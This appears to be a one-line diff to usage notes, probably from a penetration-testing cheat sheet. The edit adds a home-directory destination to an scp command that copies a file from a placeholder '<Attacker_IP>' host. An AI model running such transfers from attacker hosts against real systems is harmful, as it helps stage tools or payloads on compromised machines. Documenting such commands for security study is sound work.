@@ -1,2 +1,2 @@
 Usage:
-  scp <username>@<Attacker_IP>:<directory>/<filename>
+  scp <username>@<Attacker_IP>:<directory>/<filename> ~
